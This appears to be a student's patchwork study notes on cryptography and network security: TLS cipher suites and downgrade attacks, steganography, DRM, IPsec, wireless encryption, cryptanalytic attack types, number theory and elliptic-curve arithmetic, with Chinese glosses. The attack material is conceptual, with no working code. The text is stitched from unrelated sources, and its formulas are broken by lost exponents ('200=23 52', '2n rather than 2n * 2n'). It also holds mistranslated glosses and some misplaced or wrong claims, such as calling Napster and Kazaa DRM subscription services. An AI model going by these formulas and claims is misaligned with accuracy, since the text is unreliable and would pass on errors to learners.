  - TLS supports several types of symmetric encryption, including 3DES and AES.
  - Authentication. TLS uses certificates for authentication.
  - Clients can verify the authenticity of the certificate by querying
the CA that issued the certificate.
  - Integrity. TLS uses a message authentication code (MAC) for integrity.   - example, it can use HMAC-MD5 or HMAC-SHA256.
  - There are over 200 named cipher suites, and systems identify them with a cipher identifier as a string of hexadecimal characters and a coded name.
  - Here are two examples:
  - 0x00C031.
TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
  - 0x00003C. TLS_RSA_WITH_AES_128_CBC_SHA256
  - Protocol. Both are using TLS.
  - Key exchange method. The first one is using ECDH and the
second one is using RSA.
  - Authentication. Both are using RSA, though, they shortenedthe code in the second one. Instead of listing RSA twice (for both the key exchange method and authentication), it is only listed once.
  - Encryption. Both are using 128-bit AES, though in different modes of operation. Galois/ Counter Mode (GCM) and Cipher Block Chaining (CBC) are the two modes identified here.
  - Integrity. Both are using the SHA-256 hashingalgorithm. Some cipher suites are very old and include encryption algorithms such as DES.
- Clearly, they shouldn’t be used and are disabled by default in most systems today. When necessary, administrators configure systems and applications to disable older specific cipher suites.
When two systems connect, they negotiate to identify which cipher suite they use. Each system passes a prioritized list of cipher suites it is willing to use. They then choose the cipher suite that is highest on their lists and common to both lists. Implementation Versus Algorithm Selection
As you read about different algorithms and different modes of operation, you might have been wondering how this is relevant. It really depends on your job. Two terms are relevant here:
Crypto module: a set of hardware, software, and/or firmware that implements cryptographic functions. This includes algorithms for encryption and hashing, key generation, and authentication techniques such as a digitalsignature.
Crypto service providers: a software library of cryptographic standards and algorithms. These libraries are typically distributed within crypto modules.
- Example
- software developers access software libraries when implementing cryptographic functions in their programs.
- If they need to encrypt data, they don’t start from nothing. Instead, they access a crypto service provider, or cryptographic service provider, which is a library of different implementations of cryptographic standards and algorithms.
Crypto service providers are typically distributed within crypto modules.
- example, Python is a popular application used by web developers to create dynamic web sites. Python includes a rich assortment of crypto modules developers can use. The Python Cryptography Toolkit includes a library of both hashing functions and encryption algorithms. Developers simply follow the syntax defined within the library to implement these hashing functions and encryption algorithms.
Developers should know about the different cryptographic algorithms, along with the different modes of operation. example, although it’s possible to select DES for encryption, this would be a mistake because DES has been deprecated. Similarly, it’s possible for a developer to implement an algorithm using the ECB mode of operation. However, ECB has known weaknesses, so this would also be a mistake.
- Administrators implement algorithms via cipher suites on servers. - Their responsibility is to ensure that deprecated and weak cipher suites are disabled on servers. If administrators leave weak or deprecated algorithms functioning on servers, it makes the servers susceptible to attacks such as downgrade attacks.
Downgrade Attacks on Weak Implementations
downgrade attack
- a type of attack that forces a system to downgrade its security.
- The attacker then exploits the lesser securitycontrol. It is most often associated with cryptographic attacks due to weak implementations of cipher suites.
The common example is with Transport Layer Security (TLS) and Secure Sockets Layer (SSL).
- SSL has been replaced with TLS
- However, many servers have both SSL and TLS installed.
- If a client is unable to use TLS, the server will downgrade its security and use SSL.
Attackers exploit this vulnerability by configuring their systems so that they cannot use TLS.
- When they communicate with the server, the server downgrades security to use SSL instead of TLS.
- This allows attackers to launch SSL- based attacks such as the well-known Padding Oracle On Downgraded Legacy Encryption (POODLE) attack. ensure that SSL isn’t used on a site
- to modify the server’s protocol list and ensure that SSL is disabled.
- Typically, a web site server will have the following five options: SSL 2, SSL 3, TLS 1.0, TLS 1.1, and TLS 1.2.
- prevent SSL-based downgrade attacks by disabling SSL 2 and SSL 3 on the web site server.
Similarly, cipher suites with known vulnerabilities should be disabled. If weak cipher suites are enabled on a server, it increases the vulnerabilities.
Steganography, Watermarking Steganography 隐写术 algorithms:
- using cryptographic techniques to embed 栽种 secret messages within another message.
- making alterations to the least significant bits of the many bits that make up image files.
- The changes are so minor that there is no appreciable effect on the viewed image.
- This technique allows communicating parties to hide messages in plain sight
  - example, embed a secret message within an illustration on an ▪


## otherwise innocent web page.
- It doesn’t actually encrypt the data, can’t be classified as either symmetric or
asymmetric.
  - It hide information using obfuscation.
  - 圖片隱寫的技巧:
  - Least Significant Bit (LSB) Insertion
  - Masking and Filtering
  - Algorithms and Transformation
- often embed secret in images or WAV files, these files are often so large, the secret message would easily be missed by even the most observant inspector.
- Steganography for illegal or questionable activities
  - Like espionage 间谍行为 and child pornography.
- Steganography for legitimate purposes, adding digital watermarks to documents to protect intellectual 知识分子 property
  - The hidden information is known only to the file’s creator. If someone later creates an unauthorized copy of the content, the watermark can be used to detect the copy and (if uniquely watermarked files are provided to each original recipient) trace the offending copy back to the source.
Steganography 分類:
Semagrams:根據型態: Visual Semagrams、Text Semagrams
Open Codes:根據排列方式: Covered Ciphers(含Null Cipher、 Grille Cipher)、Jargon Code.
 Steganography is an extremely simple technology to use, with free tools openly available on the Internet.
- Example:
- Kali Linux:
  - Steghide and StegoSuite: embed data into graphic files.
- iSteg.
- It simply requires that you specify a text file containing your secret message and an image file that you wish to use to hide the message.
 ▪


## - Snow:
Permissions User Group File
 Steganography technique uses Whitespace to
hide secret messages - Rwx rw- r-- + Admins Admins changes
Solution:
- Check Outgoing emails containing unusually large image files
Some common examples of steganography:
- Hide data by manipulating bits:
  - manipulate some bits within an image or sound file to embed a message.
  - One method of embedding data in large files is modifying the least significant bit in some bytes.
  - By modifying the least significant bit in some of the individual bytes of a JPEG file, it embeds a message, but the changes are so small that they are difficult to detect.
  - However, if people know the file includes a message, they can easily retrieve it.
- Hide data in the white space of a file.
  - Many files have unused space (white space) at the end of file clusters.
  - Imagine a small 6 KB file stored in two 4 KB clusters.
  - It has an extra 2 KB of unused space and it’s possible to fill this white
space with a message.
  - example, you can embed a message into the white space of a GIF or
JPEG file without altering the file size.
Security professionals use steganalysis techniques to detect steganography, and the most common method is with hashing. If a single bit of a file is modified, the hashing algorithm creates a different hash. By regularly taking the hashes of different files and comparing them with previous hashes, it’s easy to detect when a
 file has been modified.
Digital Rights Management
Digital rights management (DRM) software uses encryption to enforce copyright restrictions on digital media.
Over the past decade, publishers attempted to deploy DRM schemes across a variety of media types, including music, movies and books.
In many cases, particularly with music, opponents met DRM deployment attempts with fierce opposition, arguing that the use of DRM violated their rights to freely enjoy and make backup copies of legitimately licensed media files.
As you will read in this section, many commercial attempts to deploy DRM on a widespread basis failed when users rejected the technology as intru- sive and/or obstructive.
Music DRM
The music industry has battled pirates for years, dating back to the days of homemade cassette tape duplication and carrying through compact disc and digital formats.
Music distribution companies attempted to use a variety of DRM schemes, but most backed away from the technology under pressure from consumers. The use of DRM for purchased music slowed dramatically when, facing this opposition, Apple rolled back their use of FairPlay DRM for music sold through the iTunes Store. Apple co-founder Steve Jobs foreshadowed this move when, in 2007, he issued an open letter to the music industry calling on them to allow Apple to sell DRM-free music. That letter read, in part:
The third alternative is to abolish DRMs entirely. Imagine a world where every online store sells DRM-free music encoded in open licensable formats. In such a world, any player can play music purchased from any store, and any store can sell music which is playable on all players. This is clearly the best alternative for consumers, and Apple would embrace it in a heartbeat. If the big four music companies would license Apple their music without the requirement that it be protected with a DRM, we would switch to selling only DRM-free music on our iTunes store. Every iPod ever made will play this DRM-free music.
The full essay is no longer available on Apple’s website, but an archived copy may be found at http://bit.ly/1TyBm5e.
Currently, the major use of DRM technology in music is for subscription-based services such as Napster and Kazaa, which use DRM to revoke a user’s access to downloaded music when their subscription period ends.
Do the descriptions of DRM technology in this section seem a little vague? There’s a reason for that: manufacturers typically do not disclose the details of their DRM functionality due to fears that pirates will use that information to defeat the DRM scheme.
Movie DRM
The movie industry has used a variety of DRM schemes over the years to stem the worldwide problem of movie piracy. Two of the major technologies used to protect mass-distributed media are as follows:
Content Scrambling System (CSS)
  - Enforces playback and region restrictions on DVDs.
  - This encryption scheme was broken with the release of a tool known as DeCSS that enabled the playback of CSS-protected content on Linux systems. Advanced Access Content System (AACS)
  - Protects the content stored on Blu-Ray and HD DVD media.
  - Hackers have demonstrated attacks that retrieved AACS encryption
keys and posted them on the Internet.
Industry publishers and hackers continue the cat-and-mouse game today; media companies try to protect their content and hackers seek to gain continued access to unencrypted copies.
E-book DRM
Perhaps the most successful deployment of DRM technology is in the area of book and document publishing. Most e-books made available today use some form of DRM, and these technologies also protect sensitive documents produced by corporations with DRM capabilities.
All DRM schemes in use today share a fatal flaw:
the device used to access the content must have access to the decryption key.
If the decryption key is stored on a device possessed by the end user, there is always a chance that the user will manipulate the device to gain access to the key.
Adobe Systems offers the Adobe Digital Experience Protection Technology (ADEPT) to provide DRM technology for e-books sold in a variety of formats.
ADEPT uses a combination of AES technology to encrypt the media content and RSA encryption to protect the AES key.
Many e-book readers, like Amazon Kindle, use this technology to protect their content. e-readers use a variety of formats for book distribution, and each contains its own encryption technology.
Video Game DRM
Many video games implement DRM technology that depends on consoles 控制台 using an active Internet connection to verify the game license with a cloud-based service. These technologies, like Ubisoft’s Uplay, required a constant Internet connection to facilitate gameplay. If a player lost connection, the game would cease functioning.
In March 2010, the Uplay system came under a denial-of-service attack and players of Uplay-enabled games around the world were unable to play games that previously functioned properly because their consoles were unable to access the Uplay servers.
This led to public outcry, and Ubisoft later removed the always-on requirement, shifting to a DRM approach that only requires an initial activation of the game on the console and then allows unrestricted use.
Document DRM
Although the most common uses of DRM technology protect entertainment content, organizations may also use DRM to protect the security of sensitive information stored in PDF files, office productivity documents, and other formats.
Commercial DRM products, such as Vitrium and FileOpen, use encryption to protect source content and then enable organizations to carefully control document rights.
Here are some of the common permissions restricted by document DRM: Reading a file
Modifying the contents of a file
Removing watermarks from a file
Downloading/saving a file Printing a file
Taking screenshots of file content
DRM solutions allow organizations to control these rights by: granting them when needed, revoking them when no longer necessary,
even automatically expiring rights after a specified period of time.
Networking
Use cryptographic algorithms to provide secure networking services. In the following sections, we’ll take a brief look at:
two methods used to secure communications circuits.
IPsec
Internet Security Association and Key Management Protocol (ISAKMP)
Circuit Encryption
Security administrators use 2 types of encryption techniques to protect data traveling over networks:
Link encryption
  - protects entire communications circuits by creating a secure tunnel between two points using either a hardware solution or a software solution, encrypts all traffic entering one end of the tunnel and decrypts all traffic entering the other end of the tunnel.
  - Example: company with two offices connected via a data circuit might use link encryption to protect against attackers monitoring at a point in between the two offices.
End-to-end encryption
  - protects communications between two parties (Example, client and server) and is performed independently of link encryption.
  - Example: use TLS to protect communications between user and web server. This protects against an intruder who might be monitoring traffic on the secure side of an encrypted link or traffic sent over an unencrypted link. The difference:
in link encryption, all the data (including the header, trailer, address, and routing data), is encrypted.
  - So each packet has to be decrypted at each hop so it can be properly routed to the next hop and then re-encrypted before it can be sent along its way, which slows the routing.
End-to-end encryption does not encrypt the header, trailer, address, and routing data
  - it moves faster from point to point but is more susceptible to sniffers and eavesdroppers.
When encryption happens at the higher OSI layers, it is usually end-to-end encryption, and at the lower layers of the OSI model, it is usually link encryption.
Secure Shell (SSH) is example of end-to-end encryption technique.
This suite of programs provides encrypted alternatives to common Internet
applications like FTP, Telnet, and rlogin.
  - There are actually two versions of SSH.
  - SSH1 (now insecure) supports the DES, 3DES, IDEA, and Blowfish algorithms.
  - SSH2 drops support for DES and IDEA but adds support for several other algorithms.
IPsec
Various security architectures are in use today, each one designed to address security issues in different environments. One such architecture that supports secure communications is the Internet Protocol Security (IPsec) standard. IPsec is a standard architecture set forth by the Internet Engineering Task Force (IETF) for setting up a secure channel to exchange information between two entities. The entities communicating via IPsec could be 2 systems, 2 routers, 2 gateways, or any combination of entities.
Generally used to connect 2 networks, but can also be used to connect individual computers, like a server and a workstation or a pair of workstations (sender and receiver, perhaps).
IPsec does not dictate all implementation details but is an open, modular framework that allows many manufacturers and software developers to develop IPsec solutions that work well with products from other vendors.
IPsec uses public key cryptography to provide encryption, access control, nonrepudiation, and message authentication, all using IP-based protocols.
The primary use of IPsec is for virtual private networks (VPNs), so IPsec can operate in either transport or tunnel mode.
IPsec is commonly paired with the Layer 2 Tunneling Protocol (L2TP) as L2TP/ IPsec.
The IP Security (IPsec) protocol provides a complete infrastructure for secured network communications. IPsec has gained widespread acceptance and is now offered in a number of commercial operating systems out of the box.
IPsec relies on security associations, and there are 2 main components: The Authentication Header (AH)
  - provides assurances of message integrity and nonrepudiation.
  - provides authentication and access control and prevents replay
attacks.
The Encapsulating Security Payload (ESP)
  - provides confidentiality and integrity of packet contents.
  - provides encryption and limited authentication and prevents replay
attacks.
ESP also provides some limited authentication, but not to the degree of the AH. Though ESP is sometimes used without AH, it’s rare to see AH used without ESP. IPsec provides for 2 discrete modes of operation.
When IPsec is used in transport mode, only the packet payload is encrypted. This mode is designed for peer-to-peer communication.
When it’s used in tunnel mode, the entire packet, including the header, is encrypted. This mode is designed for gateway-to-gateway communication.
IPsec is an extremely important concept in modern computer security. Be certain that you’re familiar with the component protocols and modes of IPsec operation.
At runtime, you set up an IPsec session by creating a security association (SA). The
SA represents the communication session and records any configuration and status information about the connection. The SA represents a simplex connection. If you want a two-way channel, you need 2 SAs, one for each direction. Also, if you want to support a bidirectional channel using both AH and ESP, you will need to set up four SAs.
Some of IPsec’s greatest strengths come from being able to filter or manage communications on a per-SA basis so that clients or gateways between which security associations exist can be rigorously managed in terms of what kinds of protocols or services can use an IPsec connection. Also, without a valid security association defined, pairs of users or gateways cannot establish IPsec links.
ISAKMP
The Internet Security Association and Key Management Protocol (ISAKMP) provides background security support services for IPsec by negotiating, establishing, modifying, and deleting security associations. As you learned in the previous section, IPsec relies on a system of security associations (SAs). These SAs are managed through the use of ISAKMP.
There are 4 basic requirements for ISAKMP, as set forth in Internet RFC 2408: Authenticate communicating peers
Create and manage security associations
Provide key generation mechanisms
Protect against threats (example, replay and denial-of-service attacks)
Wireless Networking
The widespread rapid adoption of wireless networks poses a tremendous security risk.
Many traditional networks do not implement encryption for routine communications between hosts on the local network and rely on the assumption that it would be too difficult for an attacker to gain physical access to the network wire inside a secure location to eavesdrop on the network.
However, wireless networks transmit data through the air, leaving them extremely vulnerable to interception.
There are two main types of wireless security:
Wired Equivalent Privacy (WEP)
  - use 64- and 128-bit encryption options to protect communications in
wireless LAN.
  - WEP is described in IEEE 802.11 as an optional component of the wireless networking standard.
  - Cryptanalysis has conclusively demonstrated that significant flaws exist in the WEP algorithm, making it possible to completely undermine the security of a WEP-protected network within seconds.
  - WPA does not provide an end-to-end security solution. It encrypts traffic only between a mobile computer and the nearest wireless access point. Once the traffic hits the wired network, it’s in the clear again. You should never use WEP encryption to protect a wireless network.
  - Example: the use of WEP encryption on a store network was the root cause behind the TJX security breach that was widely publicized in 2007.
WiFi Protected Access (WPA)
  - improves on WEP encryption by implementing the Temporal Key Integrity Protocol (TKIP), eliminating the cryptographic weaknesses that undermined WEP.
  - A further improvement to the technique, dubbed WPA2, adds AES cryptography.
  - WPA2 provides secure algorithms appropriate for use on modern wireless networks.
  - The WPA protocol encrypts traffic passing between a mobile client and the wireless access point. It does not provide end-to-end encryption.
IEEE 802.1x:
  - Another commonly used wireless security standard
  - provides a flexible framework for authentication and key management
in wired and wireless networks.
  - To use 802.1x, the client runs a piece of software, the supplicant.
  - The supplicant communicates with the authentication server.
  - After successful authentication, the network switch or wireless
access point allows the client to access the network.
  - WPA was designed to interact with 802.1x authentication servers.
Cryptographic Attacks As with any security mechanism, malicious individuals have found a number of attacks to defeat cryptosystems.:
Analytic Attack
  - an algebraic manipulation 操作 that attempts to reduce the complexity of the algorithm.
  - focus on the logic of the algorithm itself. Implementation Attack
  - a type of attack that exploits weaknesses in the implementation of a cryptography system.
  - focuses on exploiting the software code, not just errors and flaws but the methodology employed to program the encryption system.
Statistical Attack
  - exploits statistical weaknesses in a cryptosystem, such as floating- point errors and inability to produce truly random numbers.
  - attempt to find a vulnerability in the hardware or operating system hosting the cryptography application.
Brute Force attacks
  - attack attempts every possible valid combination for a key or password.
  - using massive amounts of processing power to methodically guess the key used to secure cryptographic communications.
  - For a nonflawed protocol, the average amount of time required to discover the key through a brute-force attack is directly proportional to the length of the key. A brute-force attack will always be successful given enough time.
  - Every additional bit of key length doubles the time to perform a brute- force attack because the number of potential keys doubles. brute-force attack:
  - Rainbow tables: provide precomputed values for cryptographic hashes. commonly used for cracking passwords stored on a system in hashed form.
  - scalable computing hardware designed specifically for the conduct of brute-force attacks may greatly increase the efficiency of this approach.
  - cryptographic salt
  - To help combat the use of brute-force attacks, including those aided by dictionaries and rainbow tables, cryptographers use technology known as cryptographic salt.
  - The cryptographic salt is a random value that is added to the end of the password before the operating system hashes the password. The salt is then stored in the password file along with the hash. When the operating system wishes to compare a user’s proffered password to the password file, it first retrieves the salt and appends it to the password. It feeds the concatenated value to the hash function and compares the resulting hash with the one stored in the password file.
  - Going to this extra trouble dramatically increases the difficulty of brute-force attacks. Anyone attempting to build a rainbow table must build a separate table for each possible value of the cryptographic salt.
Frequency Analysis and the Ciphertext Only Attack
  - ciphertext only attack: the only information you have at your disposal is the encrypted ciphertext message.
  - Technique helpful against simple ciphers is frequency analysis:
  - counting the number of times each letter appears in the
ciphertext.
  - the letters E, T, O, A, I, and N are the most common in the English language, you can then test several hypotheses: ciphertext, the cipher was likely a transposition cipher, rearranged the characters of the plain text without altering them.
  - If other letters are the most common in the ciphertext, the cipher is probably substitution cipher that replaced the plaintext characters.
  - This is a simple overview of frequency analysis, and many sophisticated variations on this technique can be used against polyalphabetic ciphers and other sophisticated cryptosystems.
Known Plaintext
  - the attacker has a copy of the encrypted message and the plaintext message used to generate the ciphertext (the copy). This knowledge greatly assists the attacker in breaking weaker codes.
  - Example: break the Caesar cipher if you had both a plaintext copy and a ciphertext copy of the same message.
Chosen Ciphertext
  - the attacker has the ability to decrypt chosen portions of the ciphertext message
  - use the decrypted portion of the message to discover the key. Chosen Plaintext
  - the attacker has the ability to encrypt plaintext messages of their choosing
  - analyze the ciphertext output of the encryption algorithm. Meet in the Middle
  - defeat encryption algorithms that use two rounds of encryption.
  - This attack is the reason that Double DES (2DES) was quickly discarded as a viable enhancement to the DES encryption (it was replaced by Triple DES, or 3DES).   - In the meet-in-the-middle attack:
  - the attacker uses a known plaintext message.
  - The plain text is then encrypted using every possible key (k1), and the equivalent ciphertext is decrypted using all possible keys (k2).
  - When a match is found, the corresponding pair (k1, k2) represents both portions of the double encryption.
  - This type of attack generally takes only double the time necessary to break a single round of encryption (or 2n rather
than the anticipated 2n * 2n), offering minimal added protection.
Man in the Middle
  - a malicious individual sits between two communicating parties and intercepts all communications (including the setup of the cryptographic session).
  - The attacker responds to the originator’s initialization requests and sets up a secure session with the originator.
  - The attacker then establishes a second secure session with the intended recipient using a different key and posing as the originator.
  - The attacker can then “sit in the middle” of the communication and read all traffic as it passes between the two parties.
Birthday birthday attack / collision attack / reverse hash matching
  - seeks to find flaws in the one-to-one nature of hashing functions.
  - the malicious individual seeks to substitute, in a digitally signed communication, a different message that produces the same message digest, thereby maintaining the validity of the original digital signature.
Replay attack protections.
  - the malicious individual intercepts an encrypted message between two parties (often a request for authentication) and then later “replays” the captured message to open a new session.
  - This attack can be defeated by incorporating a time stamp and expiration period into each message.
social engineering techniques can also be used in cryptanalysis. If you’re able to obtain a decryption key by simply asking the sender for it, that’s much easier than attempting to crack the cryptosystem!
Modular
Arithmetic
- Modulo operator for a positive integer n r = a mod n
a = r + kn
r = a -  a/n  n Example: 29mod13=3 29 =3+2 13
Modulo and GCD:
Example: gcd(21, 12) = 3
13mod13 =0 13=0+1 13 -1mod13 =12 12=-1+1 13
Modular
Arithmetic
- Modulo operator for a positive integer n r = a mod n equivalent to
gcd(a, b) = gcd(b, a mod b) gcd(12, 21 mod 12) = gcd(12, 9) = 3
Euclid’s GCD
Algorithm
- Euclid’s algorithm for computing the GCD repeatedly applies the formula
gcd(a, b) = gcd(b, a mod b) - Example
– gcd(412, 260) = 4
Algorithm EuclidGCD(a, b) Input integers 3,445

 a and b Output gcd(a, b) if b = 0 return a
  else
 return EuclidGCD(b, a mod b)
 Analysis
Let ai and bi be the arguments of the i-th
recursive call of algorithm EuclidGCD
We have
ai+2 =bi+1 =ai modai+1<ai+1 Sequence a1, a2, ..., an decreases exponentially, namely
ai+2  1⁄2ai fori>1
Case1ai+1  1⁄2ai ai+2 <ai+1  1⁄2ai
Case 2 ai + 1 > 1⁄2 ai ai + 2 = ai mod ai + 1 = ai - ai + 1   1⁄2 ai
Thus, the maximum number of recursive calls of algorithm EuclidGCD(a. b) is 1 + 2 log max(a. b)
Algorithm EuclidGCD(a, b) executes O(log max(a, b)) arithmetic operations The running time can also be expressed as O(log min(a, b))
Facts About Numbers
Prime number p:
  - p is an integer
  - P>2 or p=2
  - The only divisors of p are 1 and p
  - Examples: – 2, 7, 19 are primes, – -3, 0, 1, 6 are not primes
- Prime decomposition of a positive integer n: n=p1e1  ... pkek
- Example: – 200=23 52
Fundamental Theorem of Arithmetic
The prime decomposition of a positive integer is unique
The greatest common divisor (GCD)
The greatest common divisor (GCD) of two positive integers a and b gcd(a, b), the largest positive integer that divides both a and b Examples:
  - gcd(18, 30) = 6
  - gcd(0, 20) = 20
  - gcd(-21, 49) = 7
Two integers a and b are said to be relatively prime if gcd(a, b) = 1 Example:
– Integers 15 and 28 are relatively prime
Multiplicative Inverses (1)
The residues modulo a positive integer n are the set Zn = {0, 1,
2, ..., (n - 1)}
Let x and y be two elements of Zn
such that xy mod n = 1
We say that y is the multiplicative inverse of x in Zn
and we write y = x-1
Example: – Multiplicativeinversesoftheresiduesmod ulo11
Multiplicative
Inverses (2)
Theorem
An element x of Zn has a multiplicative
inverse if and only if x and n are relatively prime
- Example
– The elements of Z10 with a multiplicative
inverse are 1, 3, 7, 9
Corollary
 If is p is prime, every nonzero residue in Zp has a multiplicative inverse Theorem
A variation of Euclid’s GCD algorithm computes the multiplicative inverse of an element x of Zn or determines that it does
not exist
Example: Measuring Lengths
Consider a stick of length a and a stick of
 length b such that a and b are relatively prime
Given two integers i and j, we can measure length n= ia+jb
We show that any integer n can be written as n = ia + jb for some integers i and j
– Let s be the inverse of a in Zb We have sa mod b = 1
– There exists integer t such that sa + tb = 1 – Picki= ns and j= nt
Thus, given two sticks of relatively prime integer lengths, we can measure any integer length
Example, measure length 2 with sticks of length 3 and 7
Example: Double Hashing
Consider a hash table whose size n is a prime
In open addressing with double hashing, an operation on key x probes the following locations modulo n i, i + d, i + 2d, i + 3d, ..., i + (n – 1)d where i = h1(x) and d = h2(x)
- We show that each table location is probed by this sequence once
– Suppose (i + jd) mod n = (i + kd) mod n for some integers j and k in the
range [0, n – 1]
– We have (j - k)d mod n = 0
– Since n is prime, we have that n and d are relatively prime
– Thus, d has an inverse d- 1 in Zn
– Multiplying each side by d- 1, we obtain (j - k) mod n = 0
– We conclude that j = k •
Powers
prime p
The sequences of successive powers of the elements of Zp exhibit repeating subsequences
The sizes of the repeating subsequences and the number of their repetitions are the divisors of p - 1
Example (p = 7)
 Fermat’s Little Theorem
Theorem prime p.
  - For each nonzero residue x of Zp, we have x^(p-1) mod p=1 Example (p = 5)
1^4 mod5=1
2^4 mod5=16mod5=1
3^4 mod5=81mod5=1
4^4 mod5=256mod5=1 Corollary
Let p be a prime. For each nonzero residue x of Zp, the multiplicative inverse of x is xp - 2 mod p
Proof
x(xp - 2 mod p) mod p = xxp - 2 mod p = xp - 1 mod p = 1
Euler’s Theorem
The multiplicative group for Zn, denoted with Z*n, is the subset of elements of Zn relatively prime with n
The totient function of n, denoted with f(n), is the size of Z*n
Example
Z*10 ={1,3,7,9} f(10)=4
If p is prime, we have
Z*p = {1, 2, ..., (p - 1)} f(p) = p - 1 Euler’s Theorem
For each element x of Z*n, we have xf(n) mod n = 1 - Example (n = 10) 3f(10) mod 10 = 34 mod 10 = 81 mod 10 = 1 7f(10) mod10=74
mod10=2401mod10=1 9f(10) mod10=94 mod10=6561mod10=1
3.2 Digital Signatures
M = EPB (S) S = DSB (M).
  - S = digital signature
  - M = message
  - SB = private key
In this way, Alice is assured that message M is authored by Bob
The only disadvantage: Bob’s signature will be at least as long as the plaintext
message he is signing, so this exact approach is not used in practice.
Provide:
Integrity Authentication Non-repudiation
DSA: A cryptographic standard for digital signatures
 GF(5)
Asymmetric encryption
Low processing power requirements Suitable for small wireless devices
 Elliptic curves as algebraic/geometric entities have been studied extensively for the past 150 years, and from these studies has emerged a rich and deep theory.
Many cryptosystems often require the use of algebraic groups. Elliptic curves may be used to form elliptic curve groups.  A group is a set of elements with custom-defined arithmetic operations on those elements. For elliptic curve groups, these specific operations are defined geometrically. Introducing more stringent properties to the elements of a group, such as limiting the number of points on such a curve, creates an underlying field for an elliptic curve group.
In this classroom, elliptic curves are first examined over real numbers in order to illustrate the geometrical properties of elliptic curve groups.
Thereafter, elliptic curves groups are examined with the underlying fields of Fp (where p is a prime) and F2m (a binary representation with
2^m elements).
An elliptic curve over real numbers may be defined as the set of points (x,y) which satisfy an elliptic curve equation of the form:
y^2 = x^3 + ax + b,
x, y, a and b are real numbers
different a and b yields a different elliptic curve.
example: a = -4 and b = 0.67 gives the elliptic curve with equation y^2 = x^3 - 4x + 0.67; the graph of this curve is shown below:  If x^3 + ax + b contains no repeated factors, or equivalently if 4a^3 + 27b^2 is not 0, then the elliptic curve y^2 = x^3 + ax + b can be used to form a group.
An elliptic curve group over real numbers consists of the points on the corresponding elliptic curve, together with a special point O called the point at infinity.  P + Q = R is the additive property defined geometrically.
 Elliptic curve groups are additive groups; that is, their basic function is addition. The addition of two points in an elliptic curve is defined
geometrically.
 The negative of a point P = (xP,yP) is its reflection in the x-axis: the point -P is (xP,-yP).
Each point P on an elliptic curve, the point -P is also on the curve.
 2.1.1
 Adding distinct points P and Q. Suppose that P and Q are two distinct points on an elliptic curve, and the P is not -Q. To add the points P and Q, a line is drawn through the two points. This line will intersect the elliptic curve in exactly one more point, call -R. The point -R is reflected in the x-axis to the point R. The law for addition in an elliptic curve
group is P + Q = R. example:   The line through P and -P is a vertical line which does not intersect the elliptic curve at a third point; thus the points P and -P cannot be added as previously. It is for this reason that the elliptic curve group includes the point at infinity O. By definition, P + (-P) = O.
As a result of this equation, P + O = P in the elliptic curve group . O is called the additive identity of the elliptic curve group; all elliptic curves
have an additive identity.   To add a point P to itself, a tangent line to the curve is drawn at the point P.
If yP is not 0, then the tangent line intersects the elliptic curve at exactly one other point, -R. -R is reflected in the x-axis to R.
This operation is called doubling the point P; the law for doubling a
point on an elliptic curve group is defined by:
 P + P = 2P = R.   The tangent from P is vertical if yP = 0.
By definition, 2P = O for such a point P.
 If a point P, yP = 0, then the tangent line to the elliptic curve at P is
vertical and does not intersect the elliptic curve at any other point.
  If one wanted to find 3P in this situation, one can add 2P + P. 2P +P = O + P
This becomes P + O = P
Thus 3P = P.
3P = P, 4P = O, 5P = P, 6P = O,
7P = P, etc.   Although the previous geometric descriptions of elliptic curves provides an excellent method of illustrating elliptic curve arithmetic, it is not a practical way to implement arithmetic computations.
Algebraic formulae are constructed to efficiently compute the geometric
arithmetic.
 2.2.1 Adding distinct points P and Q  When P = (xP,yP) and Q = (xQ,yQ) are not negative of each other:
◦ P + Q = R.
 ◦ S : the slope of the line through P and Q: s = (yP - yQ) / (xP - xQ)
◦ XR = S^2 - XP - XQ and YR = -YP + S(XP - XR)
s= (-1.86-0.836)/(-2.35-(-0.1)) = -2.696/-2.25
 XR = (-2.696/-2.25)^2 - (-2.35) - (-0.1) = 3.89
YR = -(-1.86)+(-2.696/-2.25)(-2.35-3.89) = -5.62   2.2.2 Doubling the point P
  When yP is not 0:y^2 = x^3 + ax + b.
 2P = R where
S = (3XP^2 + a) / (2YP ) (the tangent on the point P)  XR = S^2 - XP - XQ = XR = S^2 - 2XP,
YR = -YP + S(XP - XR) = -YP + S(XP - XR)
Recall that a is one of the parameters chosen with the elliptic curve.
  Geometric Elliptic Curve Model. (A javascript applet that opens in a  separate window) - Coming Soon!
The following model can be used to experiment with addition in a
variety of elliptic curve groups.
 Try the following experiments:
 1. Change the variables a and b to see the resulting shape and the elliptic curve. https://www.desmos.com/calculator/ialhd71we3
  y^2 = x^3 - ax + b.
a<0, b大到一定程度，出现圆圈，a越小圆圈越⻓
越大，右边括弧越平稳vertical
  - B<0, b大到一定程度出现圆圈，b越小圆圈越小到没有，b
越大圆圈顶点向左靠近0. 两边线条相互向前靠拢，不会
    相遇
    - B=0, 一定有圆圈，右圆圈顶点是0.
  - B>0, 右圆圈顶点超过0点向右扩展. 两边线条相互向前靠  拢，会相遇。
   a=0, 无圆圈，从0点向Y轴括弧。    - B<0, 无圆圈，越小线条往后退
    - B=0, 无圆圈，顶点是0.
    - B>0, 无圆圈，线条超过0点向左靠拢
  a>0, 无圆圈，越大与y轴越贴合。
  - B<0, 无圆圈，线条往后退
    - B=0, 无圆圈，顶点是0.
     - B>0, 无圆圈，线条超过0点向左靠拢
 2. Select a point P on the curve, and then select a point Q on the curve.
Add them together.
 3. Select a point P on the curve and then double it.
 4. Try selecting a = -3 and b = 2    Elliptic Curve Groups Over Real Numbers
 1. Does the elliptic curve equation y2= x3- 7x - 6 over real numbers
define a group?  Yes, since
4a^3+ 27b^2= 4(-7)^3+ 27(-6)^2= -400
 The equation y2= x3- 7x - 6 does define an elliptic curve group because
4a^3+ 27b^2is not 0.
  2. What is the additive identity of regular integers?
 The additive identity of regular integers is 0, since x + 0 = x for all
integers.
 3.
Is (4,7) a point on the elliptic curve y2= x3- 5x + 5 over real
numbers?  Yes, since the equation holds true for x = 4 and y = 7: (7)2= (4)3- 5(4) + 5
49 = 64 - 20 + 5
49 = 49
4.
P(-4,-6), Q(17,0), R(3,9), S(0,-4)
The negative is the point reflected through the x-axis. Thus -P(-4,6), -Q(17,0), -R(3,-9), -S(0,4)
5.
    What are the negatives of the following elliptic curve points over real
numbers?
    In the elliptic curve group defined by y2= x3- 17x + 16 over real
numbers, what is P + Q if P = (0,-4) and Q = (1,0)?  P+Q=R
From the Addition formulae:
